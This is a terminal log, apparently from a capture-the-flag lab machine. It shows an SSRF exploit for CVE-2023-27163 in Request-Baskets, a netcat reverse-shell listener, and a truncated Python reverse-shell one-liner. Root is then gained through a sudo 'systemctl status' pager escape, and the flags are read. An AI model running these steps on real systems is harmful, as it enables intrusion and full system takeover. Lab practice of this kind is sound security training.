1.
```bash
──(sabeshan㉿kali)-[~/CVE/request_baskets_1.2.1]
└─$ python3 CVE-2023-27163.py
Exploit for SSRF vulnerability on Request-Baskets (1.2.1) (CVE-2023-27163).
Usage: python3 exploit.py <public_url> <targeted_url>
```
----------------------------------------------------------------------------
2.
```bash
┌──(sabeshan㉿kali)-[~/CVE/request_baskets_1.2.1]
└─$ python3 exploit.py 10.10.14.2 1337 http://10.10.11.224:55555/3e1fnu1
Running exploit on http://10.10.11.224:55555/3e1fnu1/login
┌──(sabeshan㉿kali)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.224] 60012
$ id
id
uid=1001(puma) gid=1001(puma) groups=1001(puma)
$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
puma@sau:/opt/maltrail$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                                                 
┌──(sabeshan㉿kali)-[~]
└─$ stty raw -echo; fg        
[1]  + continued  nc -lvnp 1337
puma@sau:/opt/maltrail$
```
-------------------------------------------------------------------------------------
```bash
puma@sau:~$ sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
puma@sau:~$ /usr/bin/systemctl status trail.service
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset: enabled)
     Active: active (running) since Thu 2025-08-28 12:03:01 UTC; 49min ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 899 (python3)
      Tasks: 10 (limit: 4662)
     Memory: 23.2M
     CGroup: /system.slice/trail.service
             ├─ 899 /usr/bin/python3 server.py
             ├─1281 /bin/sh -c logger -p auth.info -t "maltrail[899]" "Failed p…
             ├─1284 /bin/sh -c logger -p auth.info -t "maltrail[899]" "Failed p…
             ├─1289 sh
             ├─1292 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I…
             ├─1293 /bin/sh
             ├─1295 script /dev/null -c bash
             ├─1296 bash
             └─1309 /usr/bin/systemctl status trail.service
puma@sau:~$ sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!sshh!
root@sau:/home/puma# id
uid=0(root) gid=0(root) groups=0(root)
root@sau:/home/puma#     cat


^C
root@sau:/home/puma# cat /root/root.txt
f776d23db1e8703badbf0f13457a5b12
root@sau:/home/puma# cat user.xtx \
> '
> '
cat: 'user.xt'$'\n': No such file or directory
root@sau:/home/puma# cat user.txt
2a125d096683c2b4cde03c3122e00bf7
root@sau:/home/puma#
```
-------------------------------------------------------------------------------------
